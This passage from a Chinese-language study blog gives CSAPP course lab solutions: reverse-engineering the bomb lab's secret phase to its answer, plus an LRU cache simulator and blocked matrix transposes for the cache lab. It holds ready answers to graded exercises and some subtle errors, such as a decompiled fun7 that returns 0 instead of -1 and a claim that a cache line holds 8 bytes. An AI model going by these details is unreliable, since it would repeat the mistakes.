<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000401242</span> &lt;secret_phase&gt;:</span><br><span class="line">  <span class="number">401242</span>:	<span class="number">53</span>                   	push   %rbx</span><br><span class="line">  <span class="number">401243</span>:	e8 <span class="number">56</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40149</span>e &lt;read_line&gt;</span><br><span class="line">  <span class="number">401248</span>:	ba <span class="number">0</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0xa</span>,%edx</span><br><span class="line">  <span class="number">40124</span>d:	be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%esi</span><br><span class="line">  <span class="number">401252</span>:	<span class="number">48</span> <span class="number">89</span> c7             	mov    %rax,%rdi</span><br><span class="line">  <span class="number">401255</span>:	e8 <span class="number">76</span> f9 ff ff       	callq  <span class="number">400b</span>d0 &lt;strtol@plt&gt;</span><br><span class="line">  <span class="number">40125</span>a:	<span class="number">48</span> <span class="number">89</span> c3             	mov    %rax,%rbx</span><br><span class="line">  <span class="number">40125</span>d:	<span class="number">8</span>d <span class="number">40</span> ff             	lea    <span class="number">-0x1</span>(%rax),%eax</span><br><span class="line">  <span class="number">401260</span>:	<span class="number">3</span>d e8 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	cmp    $<span class="number">0x3e8</span>,%eax</span><br><span class="line">  <span class="number">401265</span>:	<span class="number">76</span> <span class="number">05</span>                	jbe    <span class="number">40126</span>c &lt;secret_phase+<span class="number">0x2a</span>&gt;</span><br><span class="line">  <span class="number">401267</span>:	e8 ce <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">40126</span>c:	<span class="number">89</span> de                	mov    %ebx,%esi</span><br><span class="line">  <span class="number">40126</span>e:	bf f0 <span class="number">30</span> <span class="number">60</span> <span class="number">00</span>       	mov    $<span class="number">0x6030f0</span>,%edi</span><br><span class="line">  <span class="number">401273</span>:	e8 <span class="number">8</span>c ff ff ff       	callq  <span class="number">401204</span> &lt;fun7&gt;</span><br><span class="line">  <span class="number">401278</span>:	<span class="number">83</span> f8 <span class="number">02</span>             	cmp    $<span class="number">0x2</span>,%eax</span><br><span class="line">  <span class="number">40127b</span>:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">401282</span> &lt;secret_phase+<span class="number">0x40</span>&gt;</span><br><span class="line">  <span class="number">40127</span>d:	e8 b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401282</span>:	bf <span class="number">38</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x402438</span>,%edi</span><br><span class="line">  <span class="number">401287</span>:	e8 <span class="number">84</span> f8 ff ff       	callq  <span class="number">400b</span>10 &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">40128</span>c:	e8 <span class="number">33</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">4015</span>c4 &lt;phase_defused&gt;</span><br><span class="line">  <span class="number">401291</span>:	<span class="number">5b</span>                   	pop    %rbx</span><br><span class="line">  <span class="number">401292</span>:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>查看 func7 的 assembly code</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000401204</span> &lt;fun7&gt;:</span><br><span class="line">  <span class="number">401204</span>:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          	sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">401208</span>:	<span class="number">48</span> <span class="number">85</span> ff             	test   %rdi,%rdi</span><br><span class="line">  <span class="number">40120b</span>:	<span class="number">74</span> <span class="number">2b</span>                	je     <span class="number">401238</span> &lt;fun7+<span class="number">0x34</span>&gt;</span><br><span class="line">  <span class="number">40120</span>d:	<span class="number">8b</span> <span class="number">17</span>                	mov    (%rdi),%edx</span><br><span class="line">  <span class="number">40120f</span>:	<span class="number">39</span> f2                	cmp    %esi,%edx</span><br><span class="line">  <span class="number">401211</span>:	<span class="number">7</span>e <span class="number">0</span>d                	jle    <span class="number">401220</span> &lt;fun7+<span class="number">0x1c</span>&gt;</span><br><span class="line">  <span class="number">401213</span>:	<span class="number">48</span> <span class="number">8b</span> <span class="number">7f</span> <span class="number">08</span>          	mov    <span class="number">0x8</span>(%rdi),%rdi</span><br><span class="line">  <span class="number">401217</span>:	e8 e8 ff ff ff       	callq  <span class="number">401204</span> &lt;fun7&gt;</span><br><span class="line">  <span class="number">40121</span>c:	<span class="number">01</span> c0                	add    %eax,%eax</span><br><span class="line">  <span class="number">40121</span>e:	eb <span class="number">1</span>d                	jmp    <span class="number">40123</span>d &lt;fun7+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">401220</span>:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">401225</span>:	<span class="number">39</span> f2                	cmp    %esi,%edx</span><br><span class="line">  <span class="number">401227</span>:	<span class="number">74</span> <span class="number">14</span>                	je     <span class="number">40123</span>d &lt;fun7+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">401229</span>:	<span class="number">48</span> <span class="number">8b</span> <span class="number">7f</span> <span class="number">10</span>          	mov    <span class="number">0x10</span>(%rdi),%rdi</span><br><span class="line">  <span class="number">40122</span>d:	e8 d2 ff ff ff       	callq  <span class="number">401204</span> &lt;fun7&gt;</span><br><span class="line">  <span class="number">401232</span>:	<span class="number">8</span>d <span class="number">44</span> <span class="number">00</span> <span class="number">01</span>          	lea    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</span><br><span class="line">  <span class="number">401236</span>:	eb <span class="number">05</span>                	jmp    <span class="number">40123</span>d &lt;fun7+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">401238</span>:	b8 ff ff ff ff       	mov    $<span class="number">0xffffffff</span>,%eax</span><br><span class="line">  <span class="number">40123</span>d:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>          	add    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">401241</span>:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>可以推断出 func7 的 c 代码是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func7</span><span class="params">(<span class="keyword">int</span> *p, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (*p &lt; n) <span class="keyword">return</span> <span class="number">2</span> * func7(*(p+<span class="number">8</span>), n) + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (*p == n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">2</span>*fun7(*(p+<span class="number">4</span>), n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据secret_phase的返回值为0得到输入的值与指针指向的值相等，即0x24，对应的十进制为36</p>
]]></content>
      <categories>
        <category>computer architecture</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>computer-architecture</tag>
      </tags>
  </entry>
  <entry>
    <title>[csapp] Lab4 Cache Lab</title>
    <url>/2022/03/05/%5Bcsapp%5D%20Lab4%20Cache%20Lab/</url>
    <content><![CDATA[<h1 id="Lab4-Cache-Lab"><a href="#Lab4-Cache-Lab" class="headerlink" title="Lab4 Cache Lab"></a>Lab4 Cache Lab</h1><h2 id="1-Writing-a-cache-simulator"><a href="#1-Writing-a-cache-simulator" class="headerlink" title="1. Writing a cache simulator"></a>1. Writing a cache simulator</h2><p>这个 simulator 非常的简单，完全模拟 LRU 算法就行了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* @author: chenghua.Wang</span></span><br><span class="line"><span class="comment"> * @time:   2022/02/17</span></span><br><span class="line"><span class="comment"> * @breif:  A LRU(least recently used) cache simulator.</span></span><br><span class="line"><span class="comment"> *          A file of CSAPP cache lab. Puzzle A.</span></span><br><span class="line"><span class="comment"> * @note:   compiled on ubuntu20.04 x86-64. gcc 9.3.0.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> True 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Fasle 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _string_buf_ 1024</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span> <span class="keyword">bool</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// data struct</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">bool</span> h, v;</span><br><span class="line">    <span class="keyword">int32_t</span> s, E, b;</span><br><span class="line">    <span class="keyword">char</span> t[_string_buf_];</span><br><span class="line">&#125;_argument_unit_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int64_t</span> hit_cnt, miss_cnt, eviction_cnt;</span><br><span class="line">&#125;_cnt_unit_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> valid; <span class="comment">// bits</span></span><br><span class="line">    <span class="keyword">int32_t</span> tag;</span><br><span class="line">    <span class="keyword">int32_t</span> stamp; <span class="comment">// used to count Least recently block.</span></span><br><span class="line">&#125;_cache_line_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    _cache_line_ *cache_lines;</span><br><span class="line">&#125;_cache_set_, *_cache_set_p_;</span><br><span class="line"></span><br><span class="line"><span class="comment">// global data init.</span></span><br><span class="line">_argument_unit_ arg_unit;</span><br><span class="line">_cnt_unit_ cnt_unit;</span><br><span class="line"></span><br><span class="line"><span class="comment">// argument process function set.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help_arg</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check_arg</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// cache update and init function set.</span></span><br><span class="line"><span class="function">_cache_set_p_ <span class="title">init_cache</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cache_update</span><span class="params">(<span class="keyword">uint32_t</span> address, _cache_set_p_ cache_sets)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cache_update_stamp</span><span class="params">(_cache_set_p_ cache_sets)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">simulate_cache</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    arg_unit.h = arg_unit.v = Fasle;</span><br><span class="line">    arg_unit.b = arg_unit.E = arg_unit.s = <span class="number">0</span>;</span><br><span class="line">    cnt_unit.eviction_cnt = cnt_unit.hit_cnt = cnt_unit.miss_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int32_t</span> opt;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">-1</span> != (opt = (getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>))))&#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            help_arg();</span><br><span class="line">            arg_unit.h = True;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            arg_unit.v = True;</span><br><span class="line">            help_arg();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            arg_unit.s = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            arg_unit.E = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            arg_unit.b = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(arg_unit.t, optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            help_arg();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    check_arg();</span><br><span class="line">    simulate_cache();</span><br><span class="line">    printSummary(cnt_unit.hit_cnt, cnt_unit.miss_cnt, cnt_unit.eviction_cnt);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// argument process function set.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help_arg</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-h: Optional help flag that prints usage info\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-v: Optional verbose flag that displays trace info\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-s &lt;s&gt;: Number of set index bits\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-E &lt;E&gt;: Associativity (number of lines per set)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-b &lt;b&gt;: Number of block bits\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-t &lt;tracefile&gt;: Name of the valgrind trace to replay\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check_arg</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(arg_unit.s&lt;=<span class="number">0</span> || arg_unit.E&lt;=<span class="number">0</span> || arg_unit.b&lt;=<span class="number">0</span> || arg_unit.t==<span class="literal">NULL</span>) <span class="keyword">return</span> Fasle;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// cache update and init function set.</span></span><br><span class="line"><span class="function">_cache_set_p_ <span class="title">init_cache</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/* get memory for sets and cache_line</span></span><br><span class="line"><span class="comment">     * s is Number of set index bits. so S = 2^s is the number of sets.</span></span><br><span class="line"><span class="comment">     * E is Associativity (number of lines per set)</span></span><br><span class="line"><span class="comment">     * b is Number of block bits</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int32_t</span> tmp_S = <span class="number">1</span> &lt;&lt; arg_unit.s;</span><br><span class="line">    _cache_set_p_ _ret_cache_sets = (_cache_set_p_)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(_cache_set_) * tmp_S);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int32_t</span> i = <span class="number">0</span>; i &lt; tmp_S; ++i)&#123;</span><br><span class="line">        _ret_cache_sets[i].cache_lines = (_cache_line_ *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(_cache_line_) * arg_unit.E);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int32_t</span> j = <span class="number">0</span>; j &lt; arg_unit.E; ++j)&#123;</span><br><span class="line">            _ret_cache_sets[i].cache_lines[j].valid = <span class="number">0</span>;</span><br><span class="line">            _ret_cache_sets[i].cache_lines[j].tag = <span class="number">-1</span>;</span><br><span class="line">            _ret_cache_sets[i].cache_lines[j].stamp = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _ret_cache_sets;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cache_update</span><span class="params">(<span class="keyword">uint32_t</span> address, _cache_set_p_ cache_sets)</span></span>&#123;</span><br><span class="line">    <span class="comment">// update cache, use address.</span></span><br><span class="line">    <span class="comment">// b is the Number of block bits</span></span><br><span class="line">    <span class="keyword">int32_t</span> set_index_address = (address &gt;&gt; arg_unit.b) &amp; ((<span class="number">-1U</span>) &gt;&gt; (<span class="number">64</span> - arg_unit.s));</span><br><span class="line">	<span class="keyword">int32_t</span> tag_address = address &gt;&gt; (arg_unit.b + arg_unit.s);</span><br><span class="line">    <span class="comment">// hit.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int32_t</span> i = <span class="number">0</span>; i &lt; arg_unit.E; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_sets[set_index_address].cache_lines[i].tag == tag_address)&#123;</span><br><span class="line">            cache_sets[set_index_address].cache_lines[i].stamp = <span class="number">0</span>;</span><br><span class="line">            cnt_unit.hit_cnt ++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// miss but have blank line.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int32_t</span> i = <span class="number">0</span>; i &lt; arg_unit.E; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_sets[set_index_address].cache_lines[i].valid == <span class="number">0</span>)&#123;</span><br><span class="line">            cache_sets[set_index_address].cache_lines[i].valid = <span class="number">1</span>;</span><br><span class="line">            cache_sets[set_index_address].cache_lines[i].tag = tag_address;</span><br><span class="line">            cache_sets[set_index_address].cache_lines[i].stamp = <span class="number">0</span>;</span><br><span class="line">            cnt_unit.miss_cnt ++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// miss and need to be replaced.</span></span><br><span class="line">    cnt_unit.miss_cnt ++;</span><br><span class="line">    cnt_unit.eviction_cnt ++;</span><br><span class="line">    <span class="keyword">int32_t</span> max_stamp = INT_MIN;</span><br><span class="line">    <span class="keyword">int32_t</span> max_stamp_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int32_t</span> i = <span class="number">0</span>; i &lt; arg_unit.E; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_sets[set_index_address].cache_lines[i].stamp &gt; max_stamp)&#123;</span><br><span class="line">            max_stamp = cache_sets[set_index_address].cache_lines[i].stamp;</span><br><span class="line">            max_stamp_idx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cache_sets[set_index_address].cache_lines[max_stamp_idx].tag = tag_address;</span><br><span class="line">    cache_sets[set_index_address].cache_lines[max_stamp_idx].stamp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cache_update_stamp</span><span class="params">(_cache_set_p_ cache_sets)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> tmp_S = <span class="number">1</span> &lt;&lt; arg_unit.s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int32_t</span> i = <span class="number">0</span>; i &lt; tmp_S; ++i)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int32_t</span> j = <span class="number">0</span>; j &lt; arg_unit.E; ++j)&#123;</span><br><span class="line">            cache_sets[i].cache_lines[j].stamp ++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">simulate_cache</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/* Start simulate.</span></span><br><span class="line"><span class="comment">     * Read data from file(t).</span></span><br><span class="line"><span class="comment">     * The format in file is &lt;op + address + size&gt;</span></span><br><span class="line"><span class="comment">     * &quot;I 0400d7d4,8&quot;</span></span><br><span class="line"><span class="comment">     * &quot; M 0421c7f0,4&quot;</span></span><br><span class="line"><span class="comment">     * &quot; L 04f6b868,8&quot;</span></span><br><span class="line"><span class="comment">     * &quot; S 7ff0005c8,8&quot;</span></span><br><span class="line"><span class="comment">     * ignore I instruction.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int32_t</span> tmp_S = <span class="number">1</span> &lt;&lt; arg_unit.s;</span><br><span class="line">    FILE* fp = fopen(arg_unit.t, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    _cache_set_p_ cache_sets = init_cache();</span><br><span class="line">    <span class="keyword">char</span> op;</span><br><span class="line">    <span class="keyword">uint32_t</span> address;</span><br><span class="line">    <span class="keyword">int32_t</span> size;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp, <span class="string">&quot; %c %xu,%d\n&quot;</span>, &amp;op, &amp;address, &amp;size) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">switch</span> (op)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">            cache_update(address, cache_sets);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">            cache_update(address, cache_sets);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            cache_update(address, cache_sets);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cache_update_stamp(cache_sets);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int32_t</span> i = <span class="number">0</span>; i &lt; tmp_S; ++i)&#123;</span><br><span class="line">        <span class="built_in">free</span>(cache_sets[i].cache_lines);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(cache_sets);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-Optimizing-matrix-transpose"><a href="#2-Optimizing-matrix-transpose" class="headerlink" title="2 Optimizing matrix transpose"></a>2 Optimizing matrix transpose</h2><p>首先测试的前提是 cache 32-set，each set has only one cache line，and each cache line has 32 bytes. 最多使用 12 个变量</p>
<h3 id="2-1-32-x-32"><a href="#2-1-32-x-32" class="headerlink" title="2.1 32 x 32"></a>2.1 32 x 32</h3><p><strong>先使用最原始的方法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (M == <span class="number">32</span>)&#123;</span><br><span class="line">         <span class="keyword">int</span> tmp;</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">             <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; M; j++) &#123;</span><br><span class="line">                 tmp = A[i][j];</span><br><span class="line">                 B[j][i] = tmp;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然，这样得到的结果是糟糕的。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Function 0 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:870, misses:1183, evictions:1151</span><br><span class="line"></span><br><span class="line">Function 1 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 1 (Simple row-wise scan transpose): hits:870, misses:1183, evictions:1151</span><br><span class="line"></span><br><span class="line">Summary for official submission (func 0): correctness=1 misses=1183</span><br><span class="line"></span><br><span class="line">TEST<span class="emphasis">_TRANS_</span>RESULTS=1:1183</span><br></pre></td></tr></table></figure>

<p>可以看到 miss 数达到了惊人的 1183 个。</p>
<p><strong>8x8 的分块</strong></p>
<p>对于 32 x 32 的矩阵非常容易想到可以使用 8 x 8 的分块。因为 cache line 一行能够存储的一共就是 8 Byte，在 32 x 32 的矩阵中，一行有 32 个 int， 一共就是需要 4 个 cache line 可以，那么所有 cache 可以装下矩阵的 8 行。所以这里使用 8 x 8 分块。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (M == <span class="number">32</span>)&#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)</span><br><span class="line">             <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>)</span><br><span class="line">                 <span class="keyword">for</span> (<span class="keyword">int</span> m = i; m &lt; i + <span class="number">8</span>; ++m)</span><br><span class="line">                     <span class="keyword">for</span> (<span class="keyword">int</span> n = j; n &lt; j + <span class="number">8</span>; ++n)</span><br><span class="line">                         B[n][m] = A[m][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样 8 x 8 的一组，就可以让 cache 被充分的利用起来。</p>
<p>实验结果：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Function 0 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:1710, misses:343, evictions:311</span><br><span class="line"></span><br><span class="line">Function 1 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 1 (Simple row-wise scan transpose): hits:870, misses:1183, evictions:1151</span><br><span class="line"></span><br><span class="line">Summary for official submission (func 0): correctness=1 misses=343</span><br><span class="line"></span><br><span class="line">TEST<span class="emphasis">_TRANS_</span>RESULTS=1:343</span><br></pre></td></tr></table></figure>

<p><strong>8 x 8 分块最优性能探讨</strong></p>
<p>为了探讨最优性能，我再理一遍 cache 的运行过程。在 A，B两个矩阵中，cache set 是这样被分配的。</p>
<p>$$<br>\begin{array}{l}<br>0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0 \newline<br>4&amp;4&amp;4&amp;4&amp;4&amp;4&amp;4&amp;4 \newline<br>8&amp;8&amp;8&amp;8&amp;8&amp;8&amp;8&amp;8\newline<br>12&amp;12&amp;12&amp;12&amp;12&amp;12&amp;12&amp;12\newline<br>16&amp;16&amp;16&amp;16&amp;16&amp;16&amp;16&amp;16\newline<br>20&amp;20&amp;20&amp;20&amp;20&amp;20&amp;20&amp;20\newline<br>24&amp;24&amp;24&amp;24&amp;24&amp;24&amp;24&amp;24\newline<br>28&amp;28&amp;28&amp;28&amp;28&amp;28&amp;28&amp;28\newline<br>\end{array}<br>$$</p>
<p>这个 8x8 的矩阵表示的就是 第一个分块矩阵的 set 的位置。我们以这个小的矩阵为例，解释原始方法和上文中的 8x8 方法为什么有大量的 cache miss。</p>
<p>当我们使用原始方法的时候，我们首先访问的是A[0][0]，这会造成一次 cold miss，然后写入 B[0][0]， 又会造成一次 conflict miss，接下来访问A[0][1]，会造成一次 conflict miss，在写入 B[1][0] 会造成一次 cold miss，我们可以发现有大量的 miss 被用在 A，B 矩阵的转换的过程中了。</p>
